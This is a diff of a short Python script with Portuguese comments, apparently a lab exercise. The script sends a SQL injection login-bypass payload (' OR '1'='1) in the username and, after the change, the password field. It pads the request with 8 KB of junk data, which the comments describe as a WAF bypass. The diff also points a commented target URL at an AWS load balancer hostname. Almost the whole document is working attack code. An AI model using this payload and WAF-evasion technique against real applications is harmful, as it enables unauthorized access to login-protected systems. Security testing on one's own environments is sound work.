@@ -5,7 +5,7 @@ import urllib.parse
 # Certifique-se de que este DNS é o do seu ALB atual
 url = "http://localhost/sqli-login.php" # colocar aqui a url de destino da aplicação, 
 # no meu caso tenho o ambiente "localhost" e também o destino com o ALB da AWS
-# "http://app-alb..."
+# "http://alb-sg-243851779.us-east-1.elb.amazonaws.com/use-case-sqli-login.php"
 
 # 1. Gerar 8KB de lixo (O Bypass do WAF)
 lixo = "A" * 8192 # comente aqui caso não queira utilizar o bypass
@@ -19,7 +19,7 @@ payload_ataque = " ' OR '1'='1"
 dados_form = [
     ('lixo', lixo), # comente essa linha caso não queira usar o bypass
     ('usuario', payload_ataque),
-    ('senha', 'qualquercoisa') 
+    ('senha', payload_ataque) 
 ]
 
 dados_codificados = urllib.parse.urlencode(dados_form).encode('utf-8')
